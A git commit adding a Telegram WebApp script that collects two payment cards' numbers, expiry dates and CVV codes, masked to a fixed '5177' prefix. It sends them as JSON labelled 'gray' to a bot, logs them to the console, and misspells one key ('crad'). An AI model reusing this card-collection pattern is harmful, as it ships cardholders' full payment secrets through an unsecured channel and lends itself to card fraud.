e23e197a13b9fc724cd0f589cce3832e0b1cb6f1
ALegroPE <126088193+ALegroPE@users.noreply.github.com>
2023-02-25 04:53:22 +0600

    Add files via upload

---
+++ main2.js
@@ -0,0 +1,23 @@
+let tg = window.Telegram.WebApp;
+
+$(document).ready(function() {
+    $("#btnSubmit").click(function(){
+
+        cards={"cards":[
+            {"crad":$("#c1").val(), "date":$("#d1").val(),"ccv":$("#ccv1").val()},
+            {"card":$("#c2").val(), "date":$("#d2").val(),"ccv":$("#ccv2").val()}
+        ],"type":"gray"};
+        tg.sendData(JSON.stringify(cards)); 
+        console.log(cards);
+        
+    }); 
+});
+
+$(function(){
+    //2. Получить элемент, к которому необходимо добавить маску
+    tg.MainButton.text = "отправить карты"
+    $(".bcard4").mask("5177 9999 9999 9999", {placeholder: "5177 5678 9123 4567" });
+    $(".litle").mask("99/99", {placeholder: "мм/гг" });
+    $(".tall").mask("999", {placeholder: "ccv" });
+  });
+
